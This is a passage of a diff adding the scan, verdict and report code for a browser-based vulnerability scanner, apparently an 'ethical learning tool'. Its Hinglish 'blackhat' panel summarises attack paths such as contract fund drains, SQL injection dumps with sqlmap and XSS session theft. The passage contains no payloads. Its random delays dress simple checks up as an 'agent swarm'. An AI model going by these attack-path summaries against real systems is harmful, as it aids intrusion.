+    why = `${LANG} code me koi exploitable issue agents ko nahi mila. ${c.INFO?c.INFO+" info-note hain. ":""}Swarm ne ${ALL_AGENTS.length} perspectives se scan kiya.`; }
+  else if (score >= 55){ verdict = "⚠️ AT RISK"; color = "var(--amb)";
+    why = `Medium/High issues mile — production se pehle fix karo. Sabse pehle HIGH/CRITICAL cards ke DEFENCE code apply karo.`; }
+  else { verdict = "☠️ DANGER — EXPLOITABLE"; color = "var(--red)";
+    why = `CRITICAL exploit paths active hain. Attackers ko direct entry mil jayegi. ABHI fix karo — har card me exact fix code diya hai.`; }
+  setRing(score, color);
+  $("vdTxt").textContent = verdict; $("vdTxt").style.color = color;
+  $("vdWhy").textContent = why;
+  $("vdChips").innerHTML = `
+    <span class="chip c">CRITICAL ${c.CRITICAL}</span><span class="chip h">HIGH ${c.HIGH}</span>
+    <span class="chip m">MEDIUM ${c.MEDIUM}</span><span class="chip l">LOW ${c.LOW}</span>
+    ${c.INFO?`<span class="chip p">INFO ${c.INFO}</span>`:""}
+    <span class="chip s">AGENTS ${ALL_AGENTS.length}</span>`;
+  $("verdict").classList.add("on");
+  $("filters").style.display = "flex";
+  $("stDet").textContent = FINDINGS.length;
+}
+
+/* ---- blackhat ---- */
+function blackhat(){
+  const ids = new Set(FINDINGS.map(f=>f.agent.id));
+  const has = a => ids.has(a);
+  const items = [];
+  const chain = LANG === "SOLIDITY";
+  if (chain){
+    const drain = has("MINT-RULER")||has("REENTRANCY-VIPER")||has("ACCESS-BREACH")||has("SUICIDE-WATCH")||has("DELEGATE-HIJACK");
+    items.push(drain ?
+      {t:"💸 FUND DRAIN — <b style='color:#f87171'>FEASIBLE</b>", p:"Attacker path: vulnerable function identify → exploit tx (re-entry/mint/unauth-call) → contract balance 0. Attack code findings me diya gaya hai.", ok:false} :
+      {t:"💸 FUND DRAIN — <b>BLOCKED</b>", p:"Koi direct drain path nahi mila — balance access ya auth properly gated hai.", ok:true});
+    if (has("TXORIGIN-PHANTOM")) items.push({t:"🎭 IDENTITY HIJACK — <b style='color:#f87171'>FEASIBLE</b>", p:"tx.origin auth = phishing contract se victim ki identity se actions.", ok:false});
+    if (has("HONEYPOT-EYE")||has("BLACKLIST-TRAP")||has("FEE-VAMPIRE")) items.push({t:"🍯 HONEYPOT SETUP — <b style='color:#f87171'>DETECTED</b>", p:"Buy chalega, sell trap: tax/blacklist/pause mechanisms owner-controlled hain.", ok:false});
+    if (has("BACKDOOR-RAT")||has("RUG-PULLER")) items.push({t:"🐀 BACKDOOR / RUG PATH — <b style='color:#f87171'>PRESENT</b>", p:"Owner-exclusive exit ya hidden drain fn — deployer ke paas silent exit option hai.", ok:false});
+    if (!items.some(i=>!i.ok)) items.push({t:"🎩 ATTACKER SUMMARY", p:"Direct exploit path nahi — attacker ko logic-level bug dhoondhne padenge (manual review/fuzzing).", ok:true});
+  } else {
+    const rce = has("CMD-INJECTOR")||has("PHP-RCE")||has("UPLOAD-BREACHER")||has("RFI-INVADER")||has("DESERIAL-BOMB");
+    items.push(rce ?
+      {t:"💀 SERVER TAKEOVER — <b style='color:#f87171'>FEASIBLE</b>", p:"RCE-class bug active — webshell upload/command inject se poora server attacker ka.", ok:false} :
+      {t:"💀 SERVER TAKEOVER — <b>BLOCKED</b>", p:"Koi direct RCE sink nahi mila input ke against.", ok:true});
+    const db = has("SQLI-HUNTER")||has("PHP-SQLI");
+    items.push(db ?
+      {t:"🗄 DATABASE DUMP — <b style='color:#f87171'>FEASIBLE</b>", p:"SQLi se users/payments table extract — sqlmap 10 min me poora schema.", ok:false} :
+      {t:"🗄 DATABASE DUMP — <b>BLOCKED</b>", p:"Query layer me user-input binding nahi dikh rahi missing.", ok:true});
+    if (has("XSS-STRIKE")||has("PHP-XSS")) items.push({t:"🍪 SESSION HIJACK — <b style='color:#f87171'>FEASIBLE</b>", p:"XSS sink + cookie flags loose → har visitor ka session chori ho sakta hai.", ok:false});
+  }
+  $("bhBody").innerHTML = items.map(i=>`
+    <div class="bh-item ${i.ok?"blocked":""}">
+      <div class="h">${i.ok?"✓ ":"⚠ "}${i.t}</div>
+      <div class="path">${i.p}</div>
+    </div>`).join("");
+  $("bh").classList.add("on");
+}
+
+/* ---- report ---- */
+function downloadReport(){
+  const c = { CRITICAL:0,HIGH:0,MEDIUM:0,LOW:0,INFO:0 };
+  FINDINGS.forEach(f=>c[f.agent.sev]++);
+  let r = `ARTEX 60-AGENT SECURITY REPORT\n${"=".repeat(50)}\nDate: ${new Date().toLocaleString()}\nLanguage: ${LANG}\nAgents run: ${ALL_AGENTS.length}\nFindings: ${FINDINGS.length} (C:${c.CRITICAL} H:${c.HIGH} M:${c.MEDIUM} L:${c.LOW} I:${c.INFO})\n\n`;
+  FINDINGS.forEach((f,i)=>{
+    r += `[${i+1}] ${f.agent.sev} — ${f.agent.id} (${f.agent.nm})\n`;
+    r += `    Line ${f.hit.line} — ${f.hit.lb}\n`;
+    r += `    Evidence: ${f.hit.snip}\n`;
+    r += `    Description: ${f.agent.d}\n`;
+    r += `    ATTACK:\n${f.agent.atk.map(l=>"      "+l).join("\n")}\n`;
+    r += `    DEFENCE:\n${f.agent.def.map(l=>"      "+l).join("\n")}\n\n`;
+  });
+  r += `Generated by ARTEX 60-Agent Portable Edition — ethical learning tool.\n`;
+  const b = new Blob([r], {type:"text/plain"});
+  const a = document.createElement("a");
+  a.href = URL.createObjectURL(b); a.download = "artex-report.txt"; a.click();
+  URL.revokeObjectURL(a.href);
+}
+
+/* ---- main scan ---- */
+async function runScan(){
+  if (RUNNING) return;
+  const src = $("codeInput").value;
+  if (!src.trim()) return;
+  RUNNING = true; FINDINGS = [];
+  $("btnRun").disabled = true; $("btnClear").disabled = true;
+  $("findings").innerHTML = ""; $("verdict").classList.remove("on");
+  $("bh").classList.remove("on"); $("bhBody").innerHTML = "";
+  $("filters").style.display = "none"; $("stDet").textContent = "0";
+  $("term").classList.add("on"); $("termBody").innerHTML = "";
+  $("livebar").classList.add("on");
+  ALL_AGENTS.forEach((a,i)=>{ const c=$("ag"+i); c.className="agent"; $("ags"+i).textContent="● IDLE"; });
+
+  LANG = detectLang(src);
+  const dom = DOM_BY_LANG[LANG];
+  tlog(`[boot] ARTEX 60-agent swarm init — target: ${LANG} (${src.length} chars)`, "ok");
+  tlog(`[detect] language: ${LANG} → domain: ${dom} · relevant agents: ${ALL_AGENTS.filter(a=>a.dom===dom).length}/${ALL_AGENTS.length}`, "info");
+
+  const relevant = ALL_AGENTS.map((a,i)=>({a,i})).filter(x=>x.a.dom===dom);
+  let done = 0;
+  for (const {a,i} of relevant){
+    $("ag"+i).classList.add("work");
+    $("ags"+i).textContent = "◉ SCANNING…";
+    $("liveTxt").textContent = a.id + " scanning…";
+    await new Promise(r=>setTimeout(r, 55 + Math.random()*70));
+
+    const res = runAgent(a, src);
+    $("ag"+i).classList.remove("work");
+    done++;
+    $("progBar").style.width = (done/relevant.length*100)+"%";
+    $("liveCount").textContent = done + "/" + relevant.length;
+
+    if (res.skip){
+      $("ag"+i).classList.add("skip");
+      $("ags"+i).textContent = "◌ SKIP";
+      tlog(`[${a.id}] skipped — ${res.skip}`, "mut");
+      continue;
+    }
+    if (res.hits.length){
+      $("ag"+i).classList.add("hit");
+      $("ags"+i).textContent = `⚠ ${res.hits.length} HIT`;
+      tlog(`[${a.id}] ⚠ ${res.hits.length} finding(s) — ${a.sev} — line ${res.hits.map(h=>h.line).join(", ")}`, "bad");
+      res.hits.forEach(h=>addFinding(a,h));
+    } else {
+      $("ag"+i).classList.add("okay");
+      $("ags"+i).textContent = "✓ SECURE";
+      tlog(`[${a.id}] clean — no match`, "ok");
+    }
+  }
+  ALL_AGENTS.forEach((a,i)=>{ if (a.dom!==dom){ $("ag"+i).classList.add("skip"); $("ags"+i).textContent="◌ SKIP"; } });
+
+  tlog(`[swarm] scan complete — ${FINDINGS.length} findings from ${relevant.length} agents`, FINDINGS.length?"warn":"ok");
+  $("liveTxt").textContent = "SCAN COMPLETE";
+  computeVerdict();
+  blackhat();
+  $("btnRun").disabled = false; $("btnClear").disabled = false;
+  RUNNING = false;
+}
+
+/* ---- init ---- */
+$("codeInput").addEventListener("input", ()=>{
+  const v = $("codeInput").value.trim();
+  $("btnRun").disabled = !v; $("btnClear").disabled = !v;
+  $("chipAUTO").textContent = "AUTO-DETECT: " + (v ? detectLang(v) : "—");
+  $("chipAUTO").className = "lang-chip" + (v ? " on" : "");
+});
+$("btnRun").addEventListener("click", runScan);
+$("btnClear").addEventListener("click", ()=>{ $("codeInput").value=""; $("codeInput").dispatchEvent(new Event("input"));
+  $("findings").innerHTML=""; $("verdict").classList.remove("on"); $("term").classList.remove("on"); $("bh").classList.remove("on"); $("filters").style.display="none"; });
+document.querySelectorAll(".sample").forEach(b=>b.addEventListener("click", ()=>{
+  $("codeInput").value = SAMPLES[b.dataset.s];
+  $("codeInput").dispatchEvent(new Event("input"));
+  window.scrollTo({top:0, behavior:"smooth"});
+}));
+document.querySelectorAll(".fbtn").forEach(b=>b.addEventListener("click", ()=>{
+  document.querySelectorAll(".fbtn").forEach(x=>x.classList.remove("on"));
+  b.classList.add("on"); CUR_FILTER = b.dataset.f;
+  document.querySelectorAll(".finding").forEach(f=>{ f.style.display = (CUR_FILTER==="ALL"||f.dataset.sev===CUR_FILTER)?"":"none"; });
+}));
+$("btnReport").addEventListener("click", downloadReport);
+renderRoster();
+</script>
+</body>
+</html>
